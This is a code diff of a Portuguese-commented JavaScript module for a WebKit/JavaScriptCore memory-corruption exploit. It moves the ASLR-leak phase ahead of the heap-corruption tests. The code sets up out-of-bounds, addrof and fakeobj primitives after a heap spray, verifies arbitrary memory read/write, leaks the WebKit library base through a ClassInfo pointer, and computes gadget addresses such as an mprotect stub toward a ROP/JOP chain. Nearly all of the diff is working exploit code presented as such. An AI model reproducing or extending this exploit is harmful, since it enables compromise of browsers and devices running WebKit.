@@ -1,8 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v105 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit)
+// js/script3/testArrayBufferVictimCrash.mjs (v106 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit - ORDEM CORRIGIDA)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
+// - **Priorização do Vazamento de ASLR ANTES de corrupções arbitrárias no heap.**
 // - Implementação funcional de vazamento da base da biblioteca WebKit.
-// - GARANTIA DE ALOCAÇÃO LIMPA para o objeto usado no vazamento de ASLR.
 // - Removidas todas as simulações da fase de vazamento.
 // - Gerenciamento aprimorado da memória (spray volumoso e persistente).
 // - Verificação e validação contínuas em cada etapa crítica.
@@ -24,7 +24,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v105_R60_REAL_ASLR_LEAK_CLEAN";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v106_R60_REAL_ASLR_LEAK_ORDER_FIXED";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -50,7 +50,7 @@ let global_spray_objects = [];
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - Ordem Corrigida) ---`, "test");
 
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
@@ -74,7 +74,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
         logS3("Heap estabilizado inicialmente para reduzir realocações inesperadas pelo GC.", "good");
 
-        // --- FASE 2: Obter OOB e Primitivas addrof/fakeobj ---
+        // --- FASE 2: Obtendo primitivas OOB e addrof/fakeobj ---
         logS3("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
         const oobSetupStartTime = performance.now();
         logS3("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
@@ -173,88 +173,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         logS3(`Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas. Tempo: ${(performance.now() - leakerSetupStartTime).toFixed(2)}ms`, "good");
 
-        // --- FASE 4: Verificação Funcional de L/E e Teste de Resistência ---
-        logS3("--- FASE 4: Verificação Funcional de L/E e Teste de Resistência ao GC ---", "subtest");
-        const rwTestStartTime = performance.now();
-        
-        const test_obj = global_spray_objects[5000]; // Pega um objeto do meio do spray
-        logS3(`Objeto de teste escolhido do spray (índice 5000): ${JSON.stringify(test_obj)}`, "info");
-
-        // Teste de Escrita e Leitura (ciclo 1)
-        logS3("Iniciando teste funcional de Leitura/Escrita Arbitrária (Ciclo 1)...", "info");
-        const test_obj_addr = addrof_primitive(test_obj);
-        logS3(`Endereço do objeto de teste (${JSON.stringify(test_obj)}): ${test_obj_addr.toString(true)}`, "info");
-
-        const value_to_write_cycle1 = new AdvancedInt64(0x12345678, 0xABCDEF01);
-        logS3(`Valor a ser escrito (Ciclo 1): ${value_to_write_cycle1.toString(true)}`, "info");
-        
-        const prop_a_addr_test_obj = test_obj_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
-        logS3(`Endereço calculado da propriedade 'a' do test_obj: ${prop_a_addr_test_obj.toString(true)} (offset 0x${JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET.toString(16)} do test_obj_addr)`, "info");
-        
-        logS3(`Executando arb_write_primitive (Ciclo 1): escrevendo ${value_to_write_cycle1.toString(true)} no endereço ${prop_a_addr_test_obj.toString(true)}...`, "info");
-        arb_write_primitive(prop_a_addr_test_obj, value_to_write_cycle1);
-        logS3(`Escrita do valor de teste (Ciclo 1) concluída.`, "info");
-
-        logS3(`Executando arb_read_primitive (Ciclo 1): lendo do endereço ${prop_a_addr_test_obj.toString(true)}...`, "info");
-        const value_read_cycle1 = arb_read_primitive(prop_a_addr_test_obj);
-        logS3(`Leitura do valor de teste (Ciclo 1) concluída.`, "info");
-        logS3(`>>>>> VALOR LIDO DE VOLTA (Ciclo 1): ${value_read_cycle1.toString(true)} <<<<<`, "leak");
-
-        if (!value_read_cycle1.equals(value_to_write_cycle1)) {
-            throw new Error(`A verificação de L/E falhou no Ciclo 1. Escrito: ${value_to_write_cycle1.toString(true)}, Lido: ${value_read_cycle1.toString(true)}`);
-        }
-        logS3("SUCESSO: Verificação de L/E no Ciclo 1 validada.", "good");
-
-        // Teste de resistência ao GC / longevidade
-        logS3("Iniciando teste de resistência: Executando L/E arbitrária múltiplas vezes...", "info");
-        const numResistanceTests = 5;
-        let resistanceSuccessCount = 0;
-        for (let i = 0; i < numResistanceTests; i++) {
-            const test_value = new AdvancedInt64(0xAAAA0000 + i, 0xBBBB0000 + i);
-            try {
-                arb_write_primitive(prop_a_addr_test_obj, test_value);
-                const read_back_value = arb_read_primitive(prop_a_addr_test_obj);
-
-                if (read_back_value.equals(test_value)) {
-                    resistanceSuccessCount++;
-                    logS3(`[Resistência #${i}] SUCESSO: L/E consistente.`, "debug");
-                } else {
-                    logS3(`[Resistência #${i}] FALHA: L/E inconsistente. Escrito: ${test_value.toString(true)}, Lido: ${read_back_value.toString(true)}`, "error");
-                }
-            } catch (resErr) {
-                logS3(`[Resistência #${i}] ERRO: Exceção durante L/E: ${resErr.message}`, "error");
-            }
-            await PAUSE_S3(10);
-        }
-        if (resistanceSuccessCount === numResistanceTests) {
-            logS3(`SUCESSO TOTAL: Teste de resistência de L/E arbitrária concluído. ${resistanceSuccessCount}/${numResistanceTests} operações bem-sucedidas.`, "good");
-        } else {
-            logS3(`ALERTA: Teste de resistência de L/E arbitrária concluído com ${numResistanceTests - resistanceSuccessCount} falhas de ${numResistanceTests} operações.`, "warn");
-            final_result.message += ` (Teste de resistência L/E com falhas: ${numResistanceTests - resistanceSuccessCount}/${numResistanceTests})`;
-        }
-        logS3(`Verificação funcional de L/E e Teste de Resistência concluídos. Tempo: ${(performance.now() - rwTestStartTime).toFixed(2)}ms`, "info");
-
-        // --- FASE 5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (Resistente ao ASLR) e Descoberta de Gadgets ---
-        logS3("--- FASE 5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional) ---", "subtest");
+        // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (Resistente ao ASLR) e Descoberta de Gadgets ---
+        // MOVIDA PARA ANTES DOS TESTES DE CORRUPÇÃO DO HEAP
+        logS3("--- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional) ---", "subtest");
         const leakPrepStartTime = performance.now();
         let webkit_base_address = null;
-
-        // ** SOLUÇÃO PARA ALOCAÇÃO LIMPA DO OBJETO DE VAZAMENTO **
-        // Forçar uma re-inicialização completa do ambiente OOB AQUI.
-        // Isso deve limpar os slots de memória e forçar uma nova alocação para o Uint8Array
-        // em um local que não foi corrompido pela fase anterior de escrita arbitrária.
-        logS3("Forçando re-inicialização do ambiente OOB para garantir alocação limpa para o vazamento de ASLR...", "info");
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!getOOBDataView()) {
-            throw new Error("Falha ao re-inicializar ambiente OOB para vazamento de ASLR.");
-        }
-        logS3("Ambiente OOB re-inicializado com sucesso para vazamento de ASLR.", "good");
 
         logS3("Iniciando vazamento REAL da base ASLR da WebKit através de JSC::JSArrayBufferView::s_info (alocação limpa)...", "info");
 
         // 1. Criar um Uint8Array para ter um objeto do tipo ArrayBufferView
+        // Este objeto agora é criado em um heap que, idealmente, não foi corrompido
+        // pelas operações de arb_write ainda.
         const leak_candidate_u8a = new Uint8Array(1);
-        logS3(`Objeto Uint8Array criado para vazamento de ClassInfo (após re-init OOB): ${leak_candidate_u8a}`, "debug");
+        logS3(`Objeto Uint8Array criado para vazamento de ClassInfo (antes de qualquer escrita arbitrária no heap): ${leak_candidate_u8a}`, "debug");
 
         // 2. Obter o endereço de memória do objeto leak_candidate (Uint8Array)
         const leak_candidate_addr = addrof_primitive(leak_candidate_u8a);
@@ -298,6 +229,65 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
         logS3(`FUNCIONAL: Verificação da viabilidade de construir uma cadeia ROP/JOP... (requer mais lógica de exploit)`, "info");
         logS3(`PREPARADO: Ferramentas para ROP/JOP (endereços reais) estão prontas. Tempo: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
+
+        // --- FASE 5: Verificação Funcional de L/E e Teste de Resistência (AGORA FASE 6) ---
+        // Movido para depois do vazamento de ASLR
+        logS3("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-Vazamento de ASLR) ---", "subtest");
+        const rwTestPostLeakStartTime = performance.now(); // Novo timestamp
+        
+        // Repetindo o teste de L/E para garantir que as primitivas ainda funcionem
+        // após o vazamento de ASLR e as potenciais interações com o heap.
+        const test_obj_post_leak = global_spray_objects[5001]; // Usando outro objeto do spray
+        logS3(`Objeto de teste escolhido do spray (índice 5001) para teste pós-vazamento: ${JSON.stringify(test_obj_post_leak)}`, "info");
+
+        const test_obj_addr_post_leak = addrof_primitive(test_obj_post_leak);
+        logS3(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
+
+        const value_to_write_post_leak = new AdvancedInt64(0xDEADC0DE, 0xFEEDBEEF);
+        const prop_a_addr_post_leak = test_obj_addr_post_leak.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
+        
+        logS3(`Executando arb_write_primitive (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
+        arb_write_primitive(prop_a_addr_post_leak, value_to_write_post_leak);
+        logS3(`Escrita do valor de teste (Pós-Vazamento) concluída.`, "info");
+
+        logS3(`Executando arb_read_primitive (Pós-Vazamento): lendo do endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
+        const value_read_post_leak = arb_read_primitive(prop_a_addr_post_leak);
+        logS3(`Leitura do valor de teste (Pós-Vazamento) concluída.`, "info");
+        logS3(`>>>>> VALOR LIDO DE VOLTA (Pós-Vazamento): ${value_read_post_leak.toString(true)} <<<<<`, "leak");
+
+        if (!value_read_post_leak.equals(value_to_write_post_leak)) {
+            throw new Error(`A verificação de L/E falhou pós-vazamento. Escrito: ${value_to_write_post_leak.toString(true)}, Lido: ${value_read_post_leak.toString(true)}`);
+        }
+        logS3("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");
+
+        // Repetindo o teste de resistência (opcional, mas bom para robustez contínua)
+        logS3("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
+        let resistanceSuccessCount_post_leak = 0;
+        for (let i = 0; i < numResistanceTests; i++) { // Reutilizando numResistanceTests=5
+            const test_value = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
+            try {
+                arb_write_primitive(prop_a_addr_post_leak, test_value);
+                const read_back_value = arb_read_primitive(prop_a_addr_post_leak);
+
+                if (read_back_value.equals(test_value)) {
+                    resistanceSuccessCount_post_leak++;
+                    logS3(`[Resistência Pós-Vazamento #${i}] SUCESSO: L/E consistente.`, "debug");
+                } else {
+                    logS3(`[Resistência Pós-Vazamento #${i}] FALHA: L/E inconsistente. Escrito: ${test_value.toString(true)}, Lido: ${read_back_value.toString(true)}`, "error");
+                }
+            } catch (resErr) {
+                logS3(`[Resistência Pós-Vazamento #${i}] ERRO: Exceção durante L/E: ${resErr.message}`, "error");
+            }
+            await PAUSE_S3(10);
+        }
+        if (resistanceSuccessCount_post_leak === numResistanceTests) {
+            logS3(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
+        } else {
+            logS3(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
+            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak}/${numResistanceTests})`;
+        }
+        logS3(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Tempo: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
+
 
         logS3("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++++++++++", "vuln");
         final_result = {
